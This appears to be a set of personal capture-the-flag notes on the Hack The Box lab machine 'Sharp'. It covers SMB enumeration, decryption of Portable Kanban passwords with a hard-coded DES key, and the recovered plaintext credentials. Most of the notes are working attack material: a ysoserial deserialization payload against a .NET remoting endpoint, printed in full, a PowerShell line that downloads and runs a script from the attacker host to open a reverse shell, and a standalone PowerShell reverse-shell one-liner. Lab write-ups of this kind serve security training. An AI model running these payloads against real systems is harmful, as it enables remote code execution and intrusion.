# Enumeration

Name: Sharp
IP: 10.10.10.219
Ports: 

Open 10.10.10.219:135
Open 10.10.10.219:445
Open 10.10.10.219:139
Open 10.10.10.219:5985
Open 10.10.10.219:8888
Open 10.10.10.219:8889


Found on Port 5985 Microsoft-HTTPAPI/2.0
--> seems not helpful

# SMB gives something

Anonymous login successful

````
  Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        dev             Disk
        IPC$            IPC       Remote IPC
        kanban          Disk
SMB1 disabled -- no workgroup available

 +] IP: 10.10.10.219:445        Name: 10.10.10.219
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     NO ACCESS
        IPC$                                                    NO ACCESS       Remote IPC
        kanban                                                  READ ONLY
		
┌──(kalium㉿kali)-[~/sharp]
└─$ smbmap -H 10.10.10.219 -u debug -p 'SharpApplicationDebugUserPassword123!'  
[+] IP: 10.10.10.219:445        Name: 10.10.10.219                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     NO ACCESS
        IPC$                                                    READ ONLY       Remote IPC
        kanban                                                  NO ACCESS
                                                                               
																			   
┌──(kalium㉿kali)-[~/sharp]
└─$ smbmap -H 10.10.10.219 -u Lars -p G123HHrth234gRG                      
[+] IP: 10.10.10.219:445        Name: 10.10.10.219                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        kanban                                                  NO ACCESS


````
	
## DES Decription found in Portable Kanban.exe
rgbKey "7ly6UznJ"
rgbIV "XuVUm5fR"

![[docs/Pasted image 20210306221038.png]]

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)DES_Decrypt(%7B'option':'Latin1','string':'7ly6UznJ'%7D,%7B'option':'Latin1','string':'XuVUm5fR'%7D,'CBC','Raw','Raw')&input=VWEzTHlQRk0xNzVHTjhEMyt0cXdMQT09

```
"Users":[
      {
         "Id":"e8e29158d70d44b1a1ba4949d52790a0",
         "Name":"Administrator",
         "Initials":"",
         "Email":"",
         "EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==",
         "Role":"Admin",
         "Inactive":false,
         "TimeStamp":637409769245503731
      },
      {
         "Id":"0628ae1de5234b81ae65c246dd2b4a21",
         "Name":"lars",
         "Initials":"",
         "Email":"",
         "EncryptedPassword":"Ua3LyPFM175GN8D3+tqwLA==",
         "Role":"User",
         "Inactive":false,
         "TimeStamp":637409769265925613
      }
   ],



```


# Users

Administrator: G2@$btRSHJYTarg
Lars: G123HHrth234gRG

tcp://localhost:8888/SecretSharpDebugApplicationEndpoint

debug: SharpApplicationDebugUserPassword123!

--> need to recreate the client.exe to call something on the server.exe

## .net remoting

 if (args\[1\].Equals("1"))  {  IDictionary channelSinkProperties \= ChannelServices.GetChannelSinkProperties(rceObj);  channelSinkProperties\["username"\] \= "debug";  channelSinkProperties\["password"\] \= "SharpApplicationDebugUserPassword123!";  foreach (object key in channelSinkProperties.Keys)  {  Console.WriteLine("key: " + key);  }  foreach (object value in channelSinkProperties.Values)  {  Console.WriteLine("value: " + value);  }  }  Console.WriteLine(rceObj);
 
 ## NTLMSSP decode?
 --> no
 
 compile with .net version 4.5
 use RemotingExploit
 
 
 ```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.125/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.125 -Port 9000
 ```
 
 
 ## create payload mit ysoserial
 ```
 C:\Users\root\Desktop\sharp\ysoserial-1.34\Release>ysoserial.exe -o base64 -g TypeConfuseDelegate -f BinaryFormatter -c "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.125/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.125 -Port 9000"
 ```
 
 ## send it over to ExploitRemotingService
 
 ```
E:\hackthebox\sharp\exploit\ExploitRemotingService\ExploitRemotingService\bin\Debug>ExploitRemotingService.exe tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint -s --user="debug" --pass="SharpApplicationDebugUserPassword123!" --useser raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAKwBL2MgcG93ZXJzaGVsbCBpZXggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xMC4xMC4xNC4xMjUvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxJyk7SW52b2tlLVBvd2VyU2hlbGxUY3AgLVJldmVyc2UgLUlQQWRkcmVzcyAxMC4xMC4xNC4xMjUgLVBvcnQgOTAwMAYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL
 
 ```
 
 
 
 ## get service infos
 
 ```
Get-WmiObject win32_service | ?{$_.Name -like '*sql*'} | select Name, DisplayName, State, PathName
```


## copy all files from one folder

```
Copy-Item -Path C:\MyFolder -Destination \\Server\MyFolder -recurse -Force
```


## powershell rervers shell one liner

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.36",443);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) \-ne 0){;$data = (New-Object \-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

[[Writeup]]